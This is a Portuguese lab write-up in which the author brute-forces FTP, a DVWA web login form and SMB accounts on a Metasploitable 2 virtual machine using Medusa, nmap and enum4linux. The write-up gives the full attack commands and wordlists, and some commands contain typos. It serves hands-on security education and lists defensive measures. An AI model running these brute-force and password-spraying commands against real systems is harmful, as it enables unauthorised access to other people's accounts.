Desafio de Projeto "Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux"

Ambiente: Máquinas virtuais Kali Linux e Matesploitable 2 rodando no VirtualBox, com rede interna (*host-only*).

Execução dos testes

1 - Após a configuração do Matesploitable, verificar o ip da rede, para ver se ambas as máquinas virtuais se encontram na mesma rede.

Comando: ifconfig

![](./media/media/image1.png)

2 - Após configurar a VM do Kali, verificar se a VM do Matesploitable está visível para a VM do Kali.

Comando: ping -c 3 192.168.56.101

![](./media/media/image2.png)

3 - Exercício 1 -- Cenário: Servidor FTP antigo que pode estar com falhas de segurança. Objetivo: verificar se o servidor está exposto e vulnerável.

3.1 - Primeira ação é realizar a enumeração de serviços para descobrir quais estão disponíveis e suas respectivas versões.

Comando: nmap -sV -p 21,22,80,445,139 192.168.56.101

![](./media/media/image3.png)

3.2 - O alvo será o serviço FTP. Para confirmar se ele está ativo, executar o comando no terminal:

Comando: ftp 192.168.56.101

![](./media/media/image4.png)

3.3 -- O comando anterior mostrou que o serviço FTP está ativo e vulnerável, entretanto, não temos a senha para o login.

![](./media/media/image5.png)

3.4 -- Na sequência criamos duas wordlists: uma com possíveis nomes de usuários e outra com senhas comuns.

Comandos:

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

echo -e '12345\npassword\nqwerty\nmsfadmin' > pass.txt

![](./media/media/image6.png)

![](./media/media/image7.png)

![](./media/media/image8.png)

3.5 - Após a geração das listas, executar o comando de ataque com Medusa.

Comando: medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp 6

![](./media/media/image9.png)

3.6 - Para validar o acesso acessamos via ftp:

Comando: ftp 192.168.56.101

![](./media/media/image10.png)

3.7 - Como se proteger:

- Desativar serviços desnecessários;

- Utilizar protocolos mais modernos e seguros;

- Utilizar senhas fortes, imprevisíveis e alteradas periodicamente;

- Manter serviços atualizados;

- Utilizar autenticação multifator;

- Auditorias frequentes.

4 - Exercício 2 - Cenário: Compreender como ataques de força bruta podem ser aplicados a formulários web, gerando tentativas de login em massa. Objetivo: Executar um ataque de força bruta em um formulário web.

4.1 - Acessar o formulário abaixo acessando <http://192.168.56.101/dvwa/login.php> no Kali

![](./media/media/image11.png)

4.2 - Ao acessar, clicar na ferramenta do desenvolvedor, ir até network e ver quais parâmetros são esperados, Na situação em questão são esperados os parâmetros: username, password e Login.

![](./media/media/image12.png)

4.3 - Na sequência, criar as wordlists com os mesmos comandos do exercício anterior.

![](./media/media/image13.png)

4.4 - Com as wordlists geradas, utilizar a Medusa para atacar, testando as combinações possíveis:
Comando:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \ -m
PAGE: '/dvwa/login.php' \ -m
FORM: 'username=^USER^&password=^PASS^&Login=Login' \ -m
'FAIL=Login failed' -t 6

![](./media/media/image14.png)

4.5 - As credenciais encontradas podem ser validadas no formulário. Na busca anterior não foi retornado, mas as credenciais são username: admin e password: password

5 - Exercício 3 -Cenário: ataques de enumeração e spraying contra o serviço SMB (protocolo da rede da Microsoft). Objetivo: descobrir usuários e depois testar senhas comuns. Vamos simular a situação em que se consegue acesso a uma rede interna por phishing, físico ou por vetor e descobriu um servidor SMB ativo. Após isso, precisamos descobrir usuários existentes no sistema e senhas fracas neles, sem bloquear nenhuma porta.

5.1 - Verificando um ambiente corporativo mal configurado.

Comando: enum4linux -a 192.168.56.101 | tee unum4_output.txt

![](./media/media/image15.png)

5.2 - Analisando o resultado do comando anterior.

Comando: less enum4_output.txt

![](./media/media/image16.png)

5.3 - Aqui, são nomes reais das contas do sistema, ou seja, possíveis alvos:

![](./media/media/image17.png)

5.4 - Como já temos os usuários, vamos criar uma wordlist de usuários e uma wordlist para senhas e executar o ataque com Medusa. Aqui é onde não testadas poucas senhas em muitos usuários.

Comandos:

echo -e 'user\nmsfadmin\nservice' > smb_users.txt

echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

![](./media/media/image18.png)

5.5 - Por fim, validamos se a conexão foi bem-sucedida, primeiro com uma senha errada e depois com a senha encontrada no comando anterior.

Comando: smbclient -L //192.168.56.101 -U msfadmin

![](./media/media/image19.png)
------------------------------------------------------------------------
